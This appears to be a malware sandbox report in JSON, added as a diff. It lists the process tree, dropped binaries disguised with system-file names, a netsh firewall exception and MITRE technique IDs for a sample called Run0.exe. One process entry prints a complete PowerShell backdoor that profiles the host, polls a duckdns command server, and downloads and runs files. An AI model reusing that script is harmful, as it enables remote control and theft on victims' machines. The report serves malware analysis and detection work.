@@ -1,0 +1,373 @@
+{
+ "Name": "Run0.exe",
+ "Md5": "ac8dad9909e542fbbff09bd6364b0e35",
+ "UUID": "f0b3680f-97d0-4956-ab73-452e7f0b6f4c",
+ "Processes": [
+  {
+   "OID": "5f354706a6621e721e2da796",
+   "ProcessID": 2844,
+   "ParentPID": 1704,
+   "CommandLine": "\"C:\\Users\\admin\\AppData\\Local\\Temp\\Run0.exe\" ",
+   "Image": "C:\\Users\\admin\\AppData\\Local\\Temp\\Run0.exe",
+   "ProcessType": "Main process",
+   "CreationTimestamp": 1597327109569
+  },
+  {
+   "OID": "5f354708a6621e721e2db004",
+   "ProcessID": 2620,
+   "ParentPID": 2844,
+   "CommandLine": "cmd /c \"\"C:\\Users\\admin\\AppData\\Local\\Temp\\b.bat\" \"",
+   "Image": "C:\\Windows\\system32\\cmd.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1597327112210
+  },
+  {
+   "OID": "5f354708a6621e721e2db006",
+   "ProcessID": 996,
+   "ParentPID": 2620,
+   "CommandLine": "\"C:\\Program Files\\Internet Explorer\\iexplore.exe\" https://vk.com/iioouu",
+   "Image": "C:\\Program Files\\Internet Explorer\\iexplore.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1597327112350
+  },
+  {
+   "OID": "5f354708a6621e721e2db007",
+   "ProcessID": 3296,
+   "ParentPID": 2844,
+   "CommandLine": "\"C:\\Users\\admin\\AppData\\Local\\Temp\\pop.exe\" ",
+   "Image": "C:\\Users\\admin\\AppData\\Local\\Temp\\pop.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1597327112475
+  },
+  {
+   "OID": "5f354709a6621e721e2db574",
+   "ProcessID": 864,
+   "ParentPID": 996,
+   "CommandLine": "\"C:\\Program Files\\Internet Explorer\\iexplore.exe\" SCODEF:996 CREDAT:267521 /prefetch:2",
+   "Image": "C:\\Program Files\\Internet Explorer\\iexplore.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1597327112850
+  },
+  {
+   "OID": "5f354709a6621e721e2dbf4d",
+   "ProcessID": 3016,
+   "ParentPID": 3296,
+   "CommandLine": "\"C:\\Users\\admin\\AppData\\Local\\Temp\\RarSFX0\\sihost.exe\" ",
+   "Image": "C:\\Users\\admin\\AppData\\Local\\Temp\\RarSFX0\\sihost.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1597327113444
+  },
+  {
+   "OID": "5f35470aa6621e721e2dd2ab",
+   "ProcessID": 2768,
+   "ParentPID": 3016,
+   "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -ExecutionPolicy Bypass -Command \"$spl = '\\';$vn = 'Guest';function info { try {$mch = [environment]::Machinename;$usr = [environment]::username;$HWD = (Get-WmiObject Win32_LogicalDisk).VolumeSerialNumber;$HWD = $HWD[0];$wi = (Get-WmiObject Win32_OperatingSystem).Caption;$wi = $wi + (Get-WmiObject Win32_OperatingSystem).OSArchitecture;$wi =$wi.replace('64-bit',' x64').replace('32-bit',' x86');$av = (Get-WmiObject -Namespace 'root/SecurityCenter2' -Class 'AntiVirusProduct').displayname;$e = $env:windir + '\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe';if (test-path $e) {$nt = 'YES'} else {$nt= 'NO'}; if (test-path 'HKCU:\\vdw0rm') {$usb = 'TRUE'} else { $usb = 'FALSE'};$u = $vn + '_' + $HWD + $spl + $mch + $spl + $usr + $spl + $wi + $spl + $av + $spl + $spl + $nt + $spl + $usb + $spl;return $u} catch {Start-Sleep -s 3}};function post ($cmdv, $v) { try { $enc = [system.Text.Encoding]::UTF8;$Req = [System.Net.HttpWebRequest]::Create('http://popeyeth.duckdns.org:9942/' + $cmdv);$Req.Method = 'POST';$req.UserAgent = info;[System.IO.Stream]$stm;$stm = $Req.GetRequestStream();$Y = $enc.GetBytes([byte][char]$V);$Stm.Write($Y, 0, $Y.Length);$stm.close();$resp = $req.GetResponse().GetResponseStream();$sr = New-Object System.IO.StreamReader($resp);$v=$sr.ReadToEnd();$sr.close();return [string]$v } catch {Start-Sleep -s 3}};$infinite =$true;while($infinite) {$cmd = @(post('Vre','').ToString());$T,$T1,$T2 = $cmd[1] -csplit 'ameer',3;if ($T -eq 'exc') { try {(New-Object System.Net.WebClient).DownloadFile($T1, $env:temp + '\\' + $T2);[Diagnostics.Process]::Start($env:temp + '\\' + $T2) } catch {Start-Sleep -s 3}}; if ($T -eq 'Sc') { Try {[IO.File]::AppendAllText($env:temp + '\\' + $T2,$T1);[Diagnostics.Process]::Start($env:temp + '\\' + $T2)} Catch {Start-Sleep -s 3} }; if ($T -eq 'Rn') { try { $Gb = [system.Text.Encoding]::Default;[IO.File]::WriteAllBytes($env:temp + '\\' + $T2,$Gb.GetBytes($T1));[Diagnostics.Process]::Start($env:temp + '\\' + $T2) } catch { Start-Sleep -s 3 } }; if ($T -eq 'Up') { try { $Gb = [system.Text.Encoding]::Default;[IO.File]::WriteAllBytes($env:temp + '\\' + $T2,$Gb.GetBytes($T1));[Diagnostics.Process]::Start($env:temp + '\\' + $T2); exit } catch { Start-Sleep -s 3 } };if ($T -eq 'Cl') { exit };$T = $null;$T1= $null;$T2 = $null;Start-Sleep -s 7}\"",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1597327114100
+  },
+  {
+   "OID": "5f35470aa6621e721e2dd2ad",
+   "ProcessID": 444,
+   "ParentPID": 3296,
+   "CommandLine": "\"C:\\Users\\admin\\AppData\\Local\\Temp\\RarSFX0\\audiodg.exe\" ",
+   "Image": "C:\\Users\\admin\\AppData\\Local\\Temp\\RarSFX0\\audiodg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1597327114272
+  },
+  {
+   "OID": "5f35470fa6621e721e2dee42",
+   "ProcessID": 2812,
+   "ParentPID": 444,
+   "CommandLine": "cmd /c \"\"C:\\Users\\admin\\AppData\\Local\\Temp\\tmp941.tmp.bat\"\"",
+   "Image": "C:\\Windows\\system32\\cmd.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1597327119100
+  },
+  {
+   "OID": "5f35470fa6621e721e2dee44",
+   "ProcessID": 3660,
+   "ParentPID": 3296,
+   "CommandLine": "\"C:\\Users\\admin\\AppData\\Local\\Temp\\RarSFX0\\Realtek HD Audio Manager.exe\" ",
+   "Image": "C:\\Users\\admin\\AppData\\Local\\Temp\\RarSFX0\\Realtek HD Audio Manager.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1597327119147
+  },
+  {
+   "OID": "5f35470fa6621e721e2dee45",
+   "ProcessID": 2580,
+   "ParentPID": 2812,
+   "CommandLine": "timeout  3 ",
+   "Image": "C:\\Windows\\system32\\timeout.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1597327119210
+  },
+  {
+   "OID": "5f354712a6621e721e2dfbf0",
+   "ProcessID": 2364,
+   "ParentPID": 2812,
+   "CommandLine": "\"C:\\Users\\admin\\AppData\\Local\\Temp\\audiodg.exe\" ",
+   "Image": "C:\\Users\\admin\\AppData\\Local\\Temp\\audiodg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1597327122163
+  },
+  {
+   "OID": "5f354716a6621e721e2e0244",
+   "ProcessID": 1148,
+   "ParentPID": 3660,
+   "CommandLine": "\"C:\\Users\\admin\\AppData\\Local\\Temp\\Realtek HD Audio Manager.exe\" ",
+   "Image": "C:\\Users\\admin\\AppData\\Local\\Temp\\Realtek HD Audio Manager.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1597327125788
+  },
+  {
+   "OID": "5f354716a6621e721e2e0245",
+   "ProcessID": 2484,
+   "ParentPID": 3296,
+   "CommandLine": "\"C:\\Users\\admin\\AppData\\Local\\Temp\\RarSFX0\\dllhost.exe\" ",
+   "Image": "C:\\Users\\admin\\AppData\\Local\\Temp\\RarSFX0\\dllhost.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1597327125913
+  },
+  {
+   "OID": "5f35471ca6621e721e2e0cd4",
+   "ProcessID": 3512,
+   "ParentPID": 1148,
+   "CommandLine": "netsh firewall add allowedprogram \"C:\\Users\\admin\\AppData\\Local\\Temp\\Realtek HD Audio Manager.exe\" \"Realtek HD Audio Manager.exe\" ENABLE",
+   "Image": "C:\\Windows\\system32\\netsh.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1597327132194
+  }
+ ],
+ "Incidents": [
+  {
+   "ProcessOID": "5f354705a6621e721e2d9f77",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5f354708a6621e721e2db006",
+   "ThreatLevel": 0,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5f354708a6621e721e2db006",
+   "ThreatLevel": 0,
+   "MitreAttacks": [
+    "T1130"
+   ]
+  },
+  {
+   "ProcessOID": "5f354708a6621e721e2db006",
+   "ThreatLevel": 0,
+   "MitreAttacks": [
+    "T1130"
+   ]
+  },
+  {
+   "ProcessOID": "5f354716a6621e721e2e0244",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5f354716a6621e721e2e0244",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1060"
+   ]
+  },
+  {
+   "ProcessOID": "5f354716a6621e721e2e0244",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1089"
+   ]
+  },
+  {
+   "ProcessOID": "5f354716a6621e721e2e0245",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5f354716a6621e721e2e0244",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5f35470fa6621e721e2dee44",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1106"
+   ]
+  },
+  {
+   "ProcessOID": "5f35470fa6621e721e2dee44",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5f354708a6621e721e2db006",
+   "ThreatLevel": 0,
+   "MitreAttacks": [
+    "T1012"
+   ]
+  },
+  {
+   "ProcessOID": "5f354712a6621e721e2dfbf0",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5f35470fa6621e721e2dee44",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5f35470aa6621e721e2dd2ad",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5f35470aa6621e721e2dd2ad",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1059"
+   ]
+  },
+  {
+   "ProcessOID": "5f35470aa6621e721e2dd2ad",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1060"
+   ]
+  },
+  {
+   "ProcessOID": "5f354705a6621e721e2d9f73",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5f354709a6621e721e2db574",
+   "ThreatLevel": 0,
+   "MitreAttacks": [
+    "T1012"
+   ]
+  },
+  {
+   "ProcessOID": "5f354709a6621e721e2db574",
+   "ThreatLevel": 0,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5f354709a6621e721e2db574",
+   "ThreatLevel": 0,
+   "MitreAttacks": [
+    "T1012"
+   ]
+  },
+  {
+   "ProcessOID": "5f35470aa6621e721e2dd2ab",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5f35470aa6621e721e2dd2ad",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5f354709a6621e721e2dbf4d",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1086",
+    "T1064"
+   ]
+  },
+  {
+   "ProcessOID": "5f354709a6621e721e2dbf4d",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5f354709a6621e721e2db574",
+   "ThreatLevel": 0,
+   "MitreAttacks": [
+    "T1012"
+   ]
+  },
+  {
+   "ProcessOID": "5f354708a6621e721e2db006",
+   "ThreatLevel": 0,
+   "MitreAttacks": [
+    "T1112"
+   ]
+  },
+  {
+   "ProcessOID": "5f354708a6621e721e2db007",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5f354708a6621e721e2db007",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5f354708a6621e721e2db006",
+   "ThreatLevel": 0,
+   "MitreAttacks": [
+    "T1106"
+   ]
+  },
+  {
+   "ProcessOID": "5f354705a6621e721e2d9f72",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1012"
+   ]
+  },
+  {
+   "ProcessOID": "5f354708a6621e721e2db006",
+   "ThreatLevel": 0,
+   "MitreAttacks": [
+    "T1012"
+   ]
+  },
+  {
+   "ProcessOID": "5f354706a6621e721e2da796",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5f354708a6621e721e2db004",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5f354706a6621e721e2da796",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1059"
+   ]
+  },
+  {
+   "ProcessOID": "5f354706a6621e721e2da796",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5f354705a6621e721e2d9f79",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1012"
+   ]
+  },
+  {
+   "ProcessOID": "5f354706a6621e721e2da796",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1012"
+   ]
+  }
+ ]
+}
